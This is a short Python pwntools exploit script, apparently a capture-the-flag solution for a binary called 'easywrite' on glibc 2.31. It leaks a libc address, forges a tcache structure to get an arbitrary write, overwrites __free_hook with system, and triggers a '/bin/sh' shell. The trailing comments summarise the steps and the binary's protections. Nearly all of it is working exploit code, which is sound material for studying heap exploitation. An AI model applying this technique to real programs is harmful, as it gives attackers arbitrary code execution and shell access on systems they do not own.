from pwn import *

# 2.31
# context.log_level = 'debug'
e = ELF('./easywrite')
p = process('./easywrite')
# p = remote('124.156.183.246',20000)
libc = e.libc

p.recvuntil('Here is your gift:')
l = int(p.recvline().strip(),16)
log.info('[*] setbuf = ' + hex(l))
libc_base = l - libc.symbols['setbuf']
log.info('[*] libc_base = ' + hex(libc_base))
oneshot = libc_base + 0xe6ce6
log.info('[*] one_shot = ' + hex(oneshot))

fake_struct = p64(0x0000000100000000) + p64(0) * 0x11 + p64(libc_base + libc.symbols['__free_hook'] - 8)
p.sendafter('Input your message:',fake_struct)

p.sendafter('Where to write?:',p64(libc_base + 0x1f34f0)) # Tcache Struct Pointer

p.sendafter('Any last message?:','/bin/sh\x00'+p64(libc_base + libc.symbols['system']))

p.interactive()

'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''

'''
[+] Exploit
Tcache Pointer -> heap + 0x10
AAW? -> Write Tcache Struct
Tcache Struct -> write Tcache Bin 
malloc(0x30) -> Tcache Bin(__free_hook) write 
__free_hook -> system('/bin/sh\x00')
free() -> trigger
'''
